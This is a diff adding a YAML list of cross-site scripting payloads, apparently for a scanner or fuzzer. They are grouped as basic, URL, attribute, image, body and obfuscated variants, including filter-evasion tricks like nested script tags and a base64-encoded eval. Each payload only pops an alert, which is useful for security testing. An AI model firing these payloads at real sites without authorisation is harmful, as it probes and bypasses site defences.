@@ -1,0 +1,36 @@
+basic:
+  - 'alert(document.domain)'
+  - '"><svg/onload=alert(1)>'
+
+url:
+  - 'javascript:alert(1)'
+  - '/?param=alert(1)'
+  - '%3Csvg/onload=alert(1)%3E'
+  - '/search?q='
+  - '/page.jsp?redirect=javascript:alert(1)'
+
+attribute:
+  - '" onmouseover=alert(1) x="'
+  - '" autofocus onfocus=alert(1) x="'
+  - '" style=background:url("javascript:alert(1)")'
+  - '" src=1 onerror=alert(1) x="'
+
+img:
+  - '<img/src=javascript:alert(1)>'
+  - '<img src=1 onerror=eval(atob("YWxlcnQoMSk="))>'
+  - '<iframe/onload=alert(String.fromCharCode(88,83,83))>'
+  - 'alert(1)'
+
+body:
+  - '<script>alert(1)'
+  - '<svg/onload%0A=alert(1)>'
+  - 'alert(String.fromCharCode(88,83,83))'
+  - '<img src=x onerror=alert(/xss/.source)>'
+  - 'setTimeout(()=>alert(1),1000)'
+
+obfuscation:
+  - '<script>/*<!--*/alert(1)//-->*/</script>'
+  - '<scr<script>ipt>alert(1)</script>'
+  - '<svg/onload%0A=alert(1)>'
+  - '<script>alert(String.fromCharCode(88,83,83))</script>'
+  - '<img src=x onerror=alert(/xss/.source)>'
